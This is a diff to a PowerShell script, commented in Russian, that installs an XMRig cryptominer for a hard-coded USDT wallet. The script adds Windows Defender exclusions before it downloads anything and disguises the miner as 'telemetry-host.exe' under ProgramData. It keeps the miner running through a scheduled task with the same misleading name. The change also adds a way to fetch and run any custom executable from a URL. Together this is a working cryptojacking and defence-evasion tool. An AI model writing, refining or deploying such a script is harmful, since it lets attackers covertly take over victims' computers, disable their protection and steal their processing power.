@@ -3,10 +3,11 @@ $Coin = "USDT"
 $Wallet = "0xbD4a36e73BDa8B0f50689d60528c698FA05b6005"
 $RefCode = ""                          # Опционально: реф-код unMineable (снижает комиссию с 1% до 0.75%)
 $Pool = "rx.unmineable.com:3333"
-$MaxCpuUsage = 60                      # Процент потоков CPU (можно поменять под конкретную машину)
+$MaxCpuUsage = 60                      # Процент потоков CPU
 $InstallDir = "C:\ProgramData\SysWorker"
 $TaskName = "telemetry-host"
 $ExeFileName = "telemetry-host.exe"
+$CustomExeUrl = ""                     # Опционально: прямая ссылка на свой пересобранный/правленый .exe
 # =================
 
 $ErrorActionPreference = "Stop"
@@ -17,12 +18,12 @@ if (-not (Test-Path $InstallDir)) {
     New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
 }
 
-# 1. Исключение в Windows Defender ДО скачивания (и для директории, и для бинарника)
+# 1. Исключение в Windows Defender ДО скачивания
 try {
     Add-MpPreference -ExclusionPath $InstallDir, $TargetExePath -ErrorAction SilentlyContinue
 } catch {}
 
-# 2. Останавливаем старую задачу и старые процессы перед обновлением
+# 2. Останавливаем старые задачи и процессы
 try {
     Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
     Stop-ScheduledTask -TaskName "SysBackgroundWorker" -ErrorAction SilentlyContinue
@@ -31,23 +32,28 @@ try {
 Get-Process -Name "telemetry-host", "xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 
-# 3. Скачиваем и распаковываем XMRig для Windows x64
-$XmrigVer = "6.22.2"
-$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v$XmrigVer/xmrig-$XmrigVer-msvc-win64.zip"
-$ZipPath = "$InstallDir\xmrig.zip"
-$TmpDir = "$InstallDir\tmp"
-
+# 3. Получаем бинарник (свой по прямой ссылке либо официальный XMRig с переименованием)
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
-Expand-Archive -Path $ZipPath -DestinationPath $TmpDir -Force
 
-$ExtractedExe = Get-ChildItem -Path $TmpDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
-if (-not $ExtractedExe) {
-    throw "Не найден xmrig.exe после распаковки архива."
+if ($CustomExeUrl -ne "") {
+    Invoke-WebRequest -Uri $CustomExeUrl -OutFile $TargetExePath
+} else {
+    $XmrigVer = "6.22.2"
+    $ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v$XmrigVer/xmrig-$XmrigVer-msvc-win64.zip"
+    $ZipPath = "$InstallDir\xmrig.zip"
+    $TmpDir = "$InstallDir\tmp"
+
+    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
+    Expand-Archive -Path $ZipPath -DestinationPath $TmpDir -Force
+
+    $ExtractedExe = Get-ChildItem -Path $TmpDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
+    if (-not $ExtractedExe) {
+        throw "Не найден xmrig.exe после распаковки архива."
+    }
+
+    Move-Item -Path $ExtractedExe.FullName -Destination $TargetExePath -Force
+    Remove-Item -Path $TmpDir, $ZipPath -Recurse -Force
 }
-
-Move-Item -Path $ExtractedExe.FullName -Destination $TargetExePath -Force
-Remove-Item -Path $TmpDir, $ZipPath -Recurse -Force
 
 # 4. Генерируем config.json в UTF-8 СТРОГО БЕЗ BOM
 $UserString = "$Coin`:$Wallet.$WorkerName"
@@ -91,6 +97,6 @@ Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Pr
 Start-ScheduledTask -TaskName $TaskName
 Start-Sleep -Seconds 3
 
-Write-Host "Готово. Воркер $WorkerName запущен через задачу $TaskName." -ForegroundColor Green
+Write-Host "Готово. Воркер $WorkerName запущен через задачу $TaskName ($ExeFileName)." -ForegroundColor Green
 Get-Process -Name "telemetry-host" -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, CPU
 Get-ScheduledTask -TaskName $TaskName | Get-ScheduledTaskInfo
